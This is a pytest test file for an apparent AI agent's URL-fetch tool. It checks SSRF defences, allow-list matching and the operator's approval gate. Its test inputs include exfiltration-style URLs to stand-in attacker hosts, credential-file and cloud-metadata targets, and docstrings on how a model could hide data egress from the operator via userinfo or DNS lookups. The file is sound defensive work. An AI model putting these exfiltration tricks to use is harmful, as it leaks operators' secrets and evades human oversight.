# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Eric Lesiuta
"""`fetch`: the one way a worker with no network reads a URL.

It is an egress channel a model drives, so every check here is a default-deny
and the operator's allow-list is what makes a read silent.
"""

from __future__ import annotations

import socket
from pathlib import Path

import pytest

from agent6.config import Config
from agent6.tools.dispatch import ToolDenied, ToolDispatcher, ToolError
from agent6.tools.fetch import FetchRefused, check_url, fetch, host_allowed


@pytest.mark.parametrize(
    "url",
    [
        "http://docs.python.org/3/",  # plaintext: a MITM would feed the model
        "file:///etc/passwd",
        "ftp://example.com/x",
        "/etc/passwd",
        "https:///nohost",
    ],
)
def test_only_https_with_a_host_is_fetched(url: str) -> None:
    with pytest.raises(FetchRefused):
        check_url(url)


@pytest.mark.parametrize(
    "host",
    [
        "127.0.0.1",  # a loopback admin port
        "169.254.169.254",  # the cloud metadata endpoint
        "10.0.0.1",
        "192.168.1.1",
        "[::1]",
    ],
)
def test_a_literal_address_off_the_public_internet_is_refused(host: str) -> None:
    """SSRF is the whole threat: the agent process sits inside the operator's
    network and holds their credentials. A literal needs no lookup, so it is
    refused before anyone is even asked about it."""
    with pytest.raises(FetchRefused, match="not a public address"):
        check_url(f"https://{host}/x")


def test_a_name_resolving_off_the_public_internet_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A name resolves only inside `fetch`, behind the operator's gate; an
    answer off the public internet is refused there."""

    def _local(*_a: object, **_k: object) -> list[tuple[int, int, int, str, tuple[str, int]]]:
        return [(0, 0, 0, "", ("127.0.0.1", 443))]

    monkeypatch.setattr(socket, "getaddrinfo", _local)
    with pytest.raises(FetchRefused, match="not a public address"):
        fetch(check_url("https://localhost/x"))


@pytest.mark.parametrize(
    ("host", "allowed", "expected"),
    [
        ("docs.python.org", ("docs.python.org",), True),
        ("DOCS.python.ORG", ("docs.python.org",), True),  # case-folded
        ("evil.com", ("docs.python.org",), False),
        ("x.readthedocs.io", (".readthedocs.io",), True),  # a leading dot allows subdomains
        ("readthedocs.io", (".readthedocs.io",), True),
        ("notreadthedocs.io", (".readthedocs.io",), False),  # ...and only subdomains
        ("anything.example", ("*",), True),
        ("anything.example", (), False),  # empty means NONE, never everything
    ],
)
def test_the_allow_list_matches_hosts_not_prefixes(
    host: str, allowed: tuple[str, ...], expected: bool
) -> None:
    """A URL-prefix match would let `evil.com/docs.python.org` through."""
    assert host_allowed(host, allowed) is expected


def test_a_host_the_operator_never_named_is_asked_about(tmp_path: Path) -> None:
    """The list is the standing approval; a host off it is the operator's call.
    The ask shows the parsed host and path, never the raw URL."""
    asked: list[str] = []

    def _deny(prompt: str, /, *, standing: bool = True) -> bool:
        asked.append(prompt)
        return False

    d = ToolDispatcher(root=tmp_path, config=Config(), approver=_deny)
    with pytest.raises(ToolDenied, match="fetch not approved"):
        d.dispatch("fetch", {"url": "https://example.com/x?k=v"})
    assert asked == ["Allow fetch: example.com /x"]


def test_an_allowed_host_is_never_prompted_for(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from agent6.tools import dispatch as dispatch_mod
    from agent6.tools.fetch import Checked, Fetched

    def _loud(_prompt: str, /, *, standing: bool = True) -> bool:
        return pytest.fail("an allowed host must not prompt")

    def _fetched(checked: Checked) -> Fetched:
        return Fetched(url=checked.url, status=200, content_type="text/plain", body="hello")

    monkeypatch.setattr(dispatch_mod, "fetch", _fetched)
    cfg = Config.model_validate({"sandbox": {"fetch_hosts": ["example.com"]}})
    d = ToolDispatcher(root=tmp_path, config=cfg, approver=_loud)
    assert d.dispatch("fetch", {"url": "https://example.com/x"}).to_wire()["body"] == "hello"


def test_the_tool_is_hidden_when_commands_already_have_the_network(tmp_path: Path) -> None:
    """With `tool_network = "allow"` the worker can run curl. Two ways to do
    one thing is the thing we do not do."""
    blocked = ToolDispatcher(root=tmp_path, config=Config())
    allowed = ToolDispatcher(
        root=tmp_path, config=Config.model_validate({"sandbox": {"tool_network": "allow"}})
    )
    assert "fetch" in blocked.available_tool_names()
    assert "fetch" not in allowed.available_tool_names()


def test_a_url_naming_one_host_and_dialling_another_is_refused() -> None:
    """httpx builds an Authorization header from userinfo, so `@` is the model
    choosing a credential AND hiding the real host: the operator's eye lands on
    `docs.python.org` while the query string goes to `evil.example`."""
    with pytest.raises(FetchRefused, match="credentials"):
        check_url("https://docs.python.org@evil.example/exfil?k=SECRET")


def test_allowing_every_command_does_not_allow_the_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One "s" at a run_command prompt set a session marker the shared approver
    short-circuits on -- so every later fetch, to any host, was auto-approved
    for the rest of the run. The operator was answering about commands: both
    the prompt and the modal say so."""
    from agent6.events import EventSink
    from agent6.sessions.ipc import set_away_mode, set_session_allow
    from agent6.ui.cli._interact import build_approver

    session_dir = tmp_path / "run"
    (session_dir / "approvals").mkdir(parents=True)
    set_session_allow(session_dir)
    approve = build_approver(session_dir, EventSink(session_dir / "logs.jsonl"))

    assert approve("Allow run_command: ls") is True
    # away-mode deny, so the opted-out call refuses instead of polling for a
    # front-end that will never attach.
    set_away_mode(session_dir, "deny")
    assert approve("Allow fetch: evil.example /x", standing=False) is False


def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
    """Every other hiding rule has a matching refusal in dispatch; this one had
    none, so exposure and enforcement could drift."""
    cfg = Config.model_validate({"sandbox": {"tool_network": "allow"}})
    d = ToolDispatcher(root=tmp_path, config=cfg)
    assert "fetch" not in d.available_tool_names()
    with pytest.raises(ToolError, match="not available"):
        d.dispatch("fetch", {"url": "https://example.com/x"})


def test_a_denied_fetch_never_touches_the_resolver(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A DNS query for `<data>.attacker.example` delivers its label to whoever
    runs that name's authoritative server: resolving ahead of the gate was an
    egress channel no allow-list and no approver ever saw."""
    resolved: list[object] = []

    def _spy(*args: object, **kwargs: object) -> list[object]:
        resolved.append(args)
        raise OSError("the resolver must not be reached")

    monkeypatch.setattr(socket, "getaddrinfo", _spy)

    def _deny(_prompt: str, /, *, standing: bool = True) -> bool:
        return False

    d = ToolDispatcher(root=tmp_path, config=Config(), approver=_deny)
    with pytest.raises(ToolDenied, match="fetch not approved"):
        d.dispatch("fetch", {"url": "https://payload.exfil.attacker.example/x"})
    assert resolved == []


def test_a_machine_state_gets_no_network(tmp_path: Path) -> None:
    """It answers about ITS input. A deliverable assembled from a page the
    state fetched is not the deliverable the operator asked for."""
    from agent6.tools.schema import mode_tools

    assert "fetch" in mode_tools("run").names
    assert "fetch" in mode_tools("ask").names
    assert "fetch" not in mode_tools("machine").names
    assert "fetch" not in mode_tools("agent").names
